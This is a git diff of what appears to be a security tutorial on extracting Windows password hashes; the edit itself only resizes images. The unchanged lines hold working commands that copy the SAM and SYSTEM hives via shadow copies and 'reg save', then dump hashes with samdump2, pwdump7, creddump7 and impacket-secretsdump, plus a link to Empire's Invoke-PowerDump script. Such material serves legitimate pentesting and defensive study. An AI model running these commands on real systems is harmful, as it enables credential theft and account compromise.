@@ -26,7 +26,7 @@ but the SYSTEM process has an exclusive lock on it, preventing us from reading o
 ```
 copy c:\Windows\System32\config\sam C:\Users\nored0x\Downloads\sam
 ```
-<img src="/img/cred1/1.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/1.PNG" alt="Getting-gz" width="1000" height="200"> 
  
 There are two potential workarounds. 
  * First, we could use the Volume Shadow Copy Server, which can create a snapshot (or “shadow volume”) of the local hard drive with vssadmin,
@@ -44,7 +44,7 @@ To verify this
  ```
 - Listing shadow volumes
  ```
-  <img src="/img/cred1/3.png" alt="Getting-gz" width="800" height="100"> 
+  <img src="/img/cred1/3.png" alt="Getting-gz" width="1000" height="100"> 
 
 
 
@@ -53,7 +53,7 @@ Shadow copying the SAM database
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\sam C:\users\nored0x\Downloads\sam
 ```
 
- <img src="/img/cred1/4.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/cred1/4.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
 The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM database. However, it is also locked by the SYSTEM account
@@ -64,17 +64,17 @@ Shadow copying the SYSTEM file
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system C:\users\nored0x\Downloads\system
 ```
 
-<img src="/img/cred1/5.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/5.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
 ```
 reg save HKLM\sam C:\users\nored0x\Downloads\sam
 ```
-<img src="/img/cred1/6.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/6.PNG" alt="Getting-gz" width="1000" height="200"> 
 ```
 reg save HKLM\system C:\users\nored0x\Desktop\system
 ```
-<img src="/img/cred1/7.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/7.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
 ## samdump2
@@ -82,7 +82,7 @@ reg save HKLM\system C:\users\nored0x\Desktop\system
 samdump2 SYSTEM SAM 
 ```
 
-<img src="/img/cred1/t1.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/t1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ## pwdump7
  This tool extracts the SAM file from the system and dumps its credentials
@@ -92,13 +92,13 @@ windws7
 ```
 pwdump7.exe 
 ```
-<img src="/img/cred1/pd7.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/pd7.PNG" alt="Getting-gz" width="1000" height="200"> 
 windows10
 ```
 pwdump7.exe
 ```
 
-<img src="/img/cred1/pd77.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/pd77.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ```
 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
@@ -110,7 +110,7 @@ sudo git clone https://github.com/Neohapsis/creddump7
 python pwdump.py /home/kali/system /home/kali/sam
 ```
 
-<img src="/img/cred1/cred7.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/cred7.PNG" alt="Getting-gz" width="1000" height="200"> 
 
     
 ## impacket
@@ -118,7 +118,7 @@ Impacket tool can also extract all the hashes for you from the SAM file
 ```
 impacket-secretsdump -system SYSTEM -sam SAM local
 ```
-<img src="/img/cred1/impacker.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/cred1/impacker.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
 ## Decrypting Hash
